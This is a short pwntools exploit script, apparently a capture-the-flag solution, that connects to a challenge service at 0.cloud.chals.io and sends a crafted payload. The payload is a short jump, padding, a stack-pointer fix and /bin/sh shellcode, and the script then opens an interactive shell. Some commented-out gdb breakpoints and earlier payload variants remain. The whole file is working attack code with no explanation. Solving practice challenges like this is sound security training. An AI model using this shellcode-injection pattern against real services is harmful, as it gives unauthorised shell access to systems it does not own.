from pwn import *

r = process('./chall')
r = remote('0.cloud.chals.io', 26352)

#pid = gdb.attach(r, gdbscript='''
#            break *execute_shellcode+485
#          ''')

            #break *main+305
            #break *main+446
context(os='linux', arch='amd64')

shellcode = shellcraft.sh()
print(shellcode)

#payload = b'jA'
#payload += b'\x90'*250
#payload += b'jA'
#payload = b'\x90'*256
payload = asm('jmp short $+0x12')
#payload = asm('jmp 0x16')
payload += b'B'*16
payload += asm('lea rsp, [rip-0x12]')
payload += asm(shellcode)

print(len(payload))
print(payload)

r.sendline(payload)

r.interactive()


